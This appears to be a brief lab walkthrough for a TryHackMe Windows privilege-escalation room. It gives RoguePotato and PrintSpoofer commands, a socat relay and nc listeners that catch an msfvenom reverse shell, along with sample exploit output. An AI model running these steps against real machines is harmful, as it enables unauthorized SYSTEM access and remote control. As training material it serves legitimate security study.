Get a service account by exploiting or if you want to do a demo :

Binaries are in the folder called files

https://tryhackme.com/room/windows10privesc

--------------------------------------------------


RoguePotato.exe 

```zsh
RoguePotato.exe -r 10.11.11.238 -e "C:\PrivEsc\rev.exe" -l 9999
```
First IP is your Kali machine IP over the VPN

We have rev.exe using msfvenom which can connect to port 53 on our kali machine so:

```zsh
nc -lvnp 53
```

```zsh
sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.67.56:9999
```
Here the IP is the Windows IP. Which we are trying to crack into.

![Rogue Potato in action](./files/Rogue.png)
------------------------------------------------------

Printspoofer.exe

```cmd
PrintSpoofer.exe -i -c rev.exe                                                                                                                                   
PrintSpoofer.exe -i -c rev.exe                                                                                                                                              
[+] Found privilege: SeImpersonatePrivilege                                                                                                                                 
[+] Named pipe listening...                                                                                                                                                 
[+] CreateProcessAsUser() OK
```

```zsh
 nc -lvnp 53
```

![PrintSpoofer.exe](./files/printspoofer.png)